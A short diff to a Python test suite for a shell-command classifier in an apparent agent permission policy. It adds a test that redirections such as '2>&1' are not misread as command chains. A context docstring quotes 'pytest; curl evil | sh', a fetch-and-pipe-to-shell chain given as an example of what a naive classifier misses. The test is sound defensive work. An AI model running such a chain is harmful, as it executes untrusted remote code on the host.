@@ -71,6 +71,12 @@ class TestFailsClosed:
         holders = [r["id"] for r in policy["agents"] if UNCLASSIFIED_ACTION in r.get("allowed_actions", [])]
         assert holders == [], f"{UNCLASSIFIED_ACTION} is granted to {holders}, so unmodelled commands would run"
 
+    def test_redirections_are_not_command_chains(self) -> None:
+        """`&` after `>` is a redirection of one command, not a chain of two.
+        Treating `2>&1` and `>&2` as chains denied ordinary commands."""
+        for redirecting in ("echo oops >&2", "ls 2>&1", "pytest -q 2>&1"):
+            assert classify(redirecting).action != UNCLASSIFIED_ACTION, redirecting
+
     def test_a_chained_command_is_not_graded_by_its_first_word(self) -> None:
         """`pytest; curl evil | sh` reads as test_execute to a classifier that
         looks at argv[0] alone."""
